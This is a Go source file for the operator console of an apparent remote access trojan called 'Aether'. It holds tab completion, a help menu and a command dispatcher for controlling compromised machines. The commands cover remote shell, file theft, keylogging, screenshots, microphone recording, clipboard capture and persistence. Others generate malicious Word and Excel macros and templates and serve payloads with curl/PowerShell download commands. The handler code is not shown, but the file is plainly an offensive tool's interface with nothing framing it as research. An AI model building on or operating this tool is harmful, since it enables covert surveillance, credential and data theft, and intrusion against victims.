package main

import (
	"fmt"
	"strings"

	"github.com/chzyer/readline"
)

type AetherCompleter struct{}

func (c *AetherCompleter) Do(line []rune, pos int) (newLine [][]rune, length int) {
	lineStr := string(line[:pos])
	endsWithSpace := len(lineStr) > 0 && lineStr[len(lineStr)-1] == ' '
	parts := strings.Fields(lineStr)

	var currentToken string
	var argIndex int

	if endsWithSpace {
		argIndex = len(parts)
		currentToken = ""
	} else if len(parts) > 0 {
		currentToken = parts[len(parts)-1]
		argIndex = len(parts) - 1
	}

	var candidates []string

	switch {
	case argIndex == 0:
		candidates = []string{
			"help", "start", "listen", "sessions", "use", "delete", "deleteall",
			"rename", "describe", "stop", "setdownloadpath", "exec", "whoami",
			"sysinfo", "download", "downloadall", "downloadrecursive", "upload",
			"ls", "cd", "pwd", "rm", "generate", "serve", "stop-serve", "get-file",
			"stoptemplate", "persist", "selfdestruct",
			"screenshot", "keylog", "clipboard", "record", "processes", "netstat",
			"arp", "users", "drives", "env", "say", "shell", "search", "zip",
			"clear", "exit",
		}

	case len(parts) >= 1:
		cmd := parts[0]
		switch cmd {
		case "listen", "use", "delete", "describe":
			if argIndex == 1 {
				candidates = getSessionNames()
			}
		case "rename":
			if argIndex == 1 || argIndex == 2 {
				candidates = getSessionNames()
			}
		case "persist":
			if argIndex == 1 {
				candidates = []string{"install", "remove", "status"}
			}
		case "keylog":
			if argIndex == 1 {
				candidates = []string{"start", "stop", "dump"}
			}
		case "start":
			if argIndex >= 4 {
				hasPersist := false
				for _, p := range parts[1:] {
					if p == "--persistent" {
						hasPersist = true
					}
				}
				if !hasPersist {
					candidates = []string{"--persistent"}
				}
			}
		case "upload":
			if argIndex == 1 {
				candidates = getLocalFiles(currentToken)
			}
		case "generate":
			if argIndex == 1 {
				candidates = []string{"macro", "template"}
			} else if argIndex == 2 && (parts[1] == "macro" || parts[1] == "template") {
				candidates = []string{"word", "excel"}
			} else if argIndex == 3 && parts[1] == "macro" {
				candidates = []string{"*.docm", "*.xlsm"}
			}
		case "get-file":
			if argIndex == 1 {
				candidates = getPayloadFiles()
			}
		}
	}

	var suggestions [][]rune
	for _, cand := range candidates {
		if strings.HasPrefix(cand, currentToken) {
			suggestions = append(suggestions, []rune(cand[len(currentToken):]))
		}
	}

	return suggestions, len([]rune(currentToken))
}

func getSessionNames() []string {
	if sessionStore == nil {
		return nil
	}
	var names []string
	for _, sess := range sessionStore.Sessions {
		if !sess.Destroyed {
			names = append(names, sess.Name)
		}
	}
	return names
}

func getPrompt() string {
	if activeConn != nil && currentSession != nil {
		return fmt.Sprintf("%saether-stream(%s)%s> ", ColorCyan, currentSession.Name, ColorReset)
	}
	return fmt.Sprintf("%saether%s> ", ColorPurple, ColorReset)
}

func refreshPrompt() {
	if rl != nil {
		rl.SetPrompt(getPrompt())
		rl.Refresh()
	}
}

func printHelp() {
	fmt.Printf("\n%s╔══════════════════════════════════════════════════════════════════════════════╗%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s║                        Available Workspace Commands                          ║%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s╠══════════════════════════════════════════════════════════════════════════════╣%s\n", ColorCyan, ColorReset)

	fmt.Printf("%s║ Session Management:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  start <name> <ip> [port]", "Create session (auto-assigns port if omitted)")
	fmt.Printf("  %-45s %s\n", "  start <name> <ip> [port] --persistent", "Create persistent session")
	fmt.Printf("  %-45s %s\n", "  listen [session_name]", "Start listener for session")
	fmt.Printf("  %-45s %s\n", "  sessions", "List all saved sessions")
	fmt.Printf("  %-45s %s\n", "  use <session_name>", "Set active session")
	fmt.Printf("  %-45s %s\n", "  delete <session_name>", "Delete a session")
	fmt.Printf("  %-45s %s\n", "  deleteall", "Delete all sessions")
	fmt.Printf("  %-45s %s\n", "  rename <old> <new>", "Rename a session")
	fmt.Printf("  %-45s %s\n", "  describe <name> <description>", "Add description")
	fmt.Printf("  %-45s %s\n", "  stop", "Disconnect from current session")
	fmt.Printf("  %-45s %s\n", "  setdownloadpath <path>", "Set download directory")

	fmt.Printf("\n%s║ Command Execution:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  exec <command>", "Execute shell command")
	fmt.Printf("  %-45s %s\n", "  whoami", "Get current user")
	fmt.Printf("  %-45s %s\n", "  sysinfo", "Get system information")

	fmt.Printf("\n%s║ File Operations:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  download <remote_path>", "Download single file")
	fmt.Printf("  %-45s %s\n", "  downloadall [path]", "Download all files in directory")
	fmt.Printf("  %-45s %s\n", "  downloadrecursive [path]", "Download directory recursively")
	fmt.Printf("  %-45s %s\n", "  upload <local> <remote>", "Upload file")
	fmt.Printf("  %-45s %s\n", "  ls [path]", "List files")
	fmt.Printf("  %-45s %s\n", "  cd <path>", "Change directory")
	fmt.Printf("  %-45s %s\n", "  pwd", "Print working directory")
	fmt.Printf("  %-45s %s\n", "  rm <path>", "Delete file")

	fmt.Printf("\n%s║ Payload Generation:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  generate macro word [input.docm]", "Print macro or inject into Word doc")
	fmt.Printf("  %-45s %s\n", "  generate macro excel [input.xlsm]", "Print macro or inject into Excel")
	fmt.Printf("  %-45s %s\n", "  generate template word [url]", "Word .docx + built-in server")
	fmt.Printf("  %-45s %s\n", "  generate template word <url>", "Word .docx + external URL")
	fmt.Printf("  %-45s %s\n", "  generate template excel", "Excel .xlsx + built-in server")
	fmt.Printf("  %-45s %s\n", "  generate template excel <url>", "Excel .xlsx + external URL")
	fmt.Printf("  %-45s %s\n", "  stoptemplate", "Stop template HTTP server")

	fmt.Printf("\n%s║ Payload Delivery:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  serve [public_ip]", "Start HTTP server (port 8081) for payloads/")
	fmt.Printf("  %-45s %s\n", "  stop-serve", "Stop payload HTTP server")
	fmt.Printf("  %-45s %s\n", "  get-file <filename>", "Show curl/PowerShell download commands")

	fmt.Printf("\n%s║ Recon & Surveillance:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  screenshot", "Capture screen and download")
	fmt.Printf("  %-45s %s\n", "  keylog <start|stop|dump>", "Keylogger control")
	fmt.Printf("  %-45s %s\n", "  clipboard", "Read clipboard contents")
	fmt.Printf("  %-45s %s\n", "  record [seconds]", "Record microphone audio (default 5s)")
	fmt.Printf("  %-45s %s\n", "  processes", "List running processes")
	fmt.Printf("  %-45s %s\n", "  netstat", "Active network connections")
	fmt.Printf("  %-45s %s\n", "  arp", "ARP table")
	fmt.Printf("  %-45s %s\n", "  users", "Local user accounts")
	fmt.Printf("  %-45s %s\n", "  drives", "List drives and volumes")
	fmt.Printf("  %-45s %s\n", "  env", "Dump environment variables")

	fmt.Printf("\n%s║ Interaction:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  say <text>", "Speak text on target via TTS")
	fmt.Printf("  %-45s %s\n", "  shell", "Interactive shell mode (type 'exit' to return)")

	fmt.Printf("\n%s║ File Utilities:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  search <pattern>", "Find files matching glob (e.g. *.docx)")
	fmt.Printf("  %-45s %s\n", "  zip <remote_path>", "Zip folder/file and download")

	fmt.Printf("\n%s║ Agent Control:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  persist <install|remove|status>", "Persistence management")
	fmt.Printf("  %-45s %s\n", "  selfdestruct", "Destroy agent and session")

	fmt.Printf("\n%s║ General:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  %-45s %s\n", "  clear", "Clear screen")
	fmt.Printf("  %-45s %s\n", "  help", "Display help")
	fmt.Printf("  %-45s %s\n", "  exit", "Exit application")

	fmt.Printf("%s╚══════════════════════════════════════════════════════════════════════════════╝%s\n\n", ColorCyan, ColorReset)
}

func operatorShell() {
	var err error
	rl, err = readline.NewEx(&readline.Config{
		Prompt:       getPrompt(),
		AutoComplete: &AetherCompleter{},
		HistoryFile:  ".aether_history",
	})
	if err != nil {
		fmt.Printf("%s[!] Failed to initialize readline: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}
		rl.SetPrompt("")

		input := strings.TrimSpace(line)
		if input == "" {
			refreshPrompt()
			continue
		}

		parts := strings.Fields(input)
		cmd := strings.ToLower(parts[0])
		refreshAfter := true

		switch cmd {
		case "help":
			printHelp()

		case "clear":
			clearScreen()
			printBanner()

		case "start":
			handleStartCommand(parts)

		case "listen":
			handleListenCommand(parts)

		case "sessions":
			listSessions()

		case "use":
			handleUseCommand(parts)

		case "delete":
			handleDeleteCommand(parts)

		case "deleteall":
			if err := deleteAllSessions(); err != nil {
				fmt.Printf("%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
			} else {
				fmt.Printf("%s[*] All sessions deleted%s\n", ColorGreen, ColorReset)
			}

		case "rename":
			handleRenameCommand(parts)

		case "describe":
			handleDescribeCommand(parts)

		case "stop":
			handleStopCommand()
			refreshAfter = false

		case "setdownloadpath":
			handleSetDownloadPath(parts)

		case "exec":
			handleExecCommand(parts)
			refreshAfter = activeConn == nil

		case "whoami":
			handleWhoamiCommand()
			refreshAfter = activeConn == nil

		case "sysinfo":
			handleSysinfoCommand()
			refreshAfter = activeConn == nil

		case "download":
			handleDownloadCommand(parts)
			refreshAfter = activeConn == nil

		case "downloadall":
			handleDownloadAllCommand(parts, false)
			refreshAfter = activeConn == nil

		case "downloadrecursive":
			handleDownloadAllCommand(parts, true)
			refreshAfter = activeConn == nil

		case "upload":
			handleUploadCommand(parts)
			refreshAfter = activeConn == nil

		case "ls":
			handleLsCommand(parts)
			refreshAfter = activeConn == nil

		case "cd":
			handleCdCommand(parts)
			refreshAfter = activeConn == nil

		case "pwd":
			handlePwdCommand()
			refreshAfter = activeConn == nil

		case "rm":
			handleRmCommand(parts)
			refreshAfter = activeConn == nil

		case "generate":
			handleGenerateCommand(parts)

		case "serve":
			var serveIP string
			if len(parts) >= 2 {
				serveIP = parts[1]
			}
			startFileServer(serveIP)
			refreshAfter = false

		case "stop-serve":
			stopFileServer()

		case "get-file":
			if len(parts) < 2 {
				fmt.Printf("%s[!] Usage: get-file <filename>%s\n", ColorYellow, ColorReset)
			} else {
				getFileCommand(parts[1])
			}

		case "stoptemplate":
			stopTemplateServer()

		case "persist":
			handlePersistCommand(parts)
			refreshAfter = activeConn == nil

		case "selfdestruct":
			handleSelfDestructCommand()
			refreshAfter = activeConn == nil

		case "screenshot":
			handleScreenshotCommand()
			refreshAfter = activeConn == nil

		case "keylog":
			handleKeylogCommand(parts)
			refreshAfter = activeConn == nil

		case "record":
			handleRecordCommand(parts)
			refreshAfter = activeConn == nil

		case "say":
			handleSayCommand(parts)
			refreshAfter = activeConn == nil

		case "search":
			handleSearchCommand(parts)
			refreshAfter = activeConn == nil

		case "zip":
			handleZipCommand(parts)
			refreshAfter = activeConn == nil

		case "processes":
			handleSimpleAgentCommand("processes")
			refreshAfter = activeConn == nil

		case "netstat":
			handleSimpleAgentCommand("netstat")
			refreshAfter = activeConn == nil

		case "arp":
			handleSimpleAgentCommand("arp")
			refreshAfter = activeConn == nil

		case "users":
			handleSimpleAgentCommand("users")
			refreshAfter = activeConn == nil

		case "drives":
			handleSimpleAgentCommand("drives")
			refreshAfter = activeConn == nil

		case "env":
			handleSimpleAgentCommand("env")
			refreshAfter = activeConn == nil

		case "clipboard":
			handleSimpleAgentCommand("clipboard")
			refreshAfter = activeConn == nil

		case "shell":
			handleShellMode()
			refreshAfter = false

		case "exit", "quit":
			if activeConn != nil {
				activeConn.Close()
			}
			stopTemplateServer()
			stopFileServer()
			saveSessionStore()
			fmt.Printf("%s[*] Exiting...%s\n", ColorBlue, ColorReset)
			return

		default:
			fmt.Printf("%s[!] Unknown command: %s%s\n", ColorRed, cmd, ColorReset)
		}

		if refreshAfter {
			refreshPrompt()
		}
	}
}
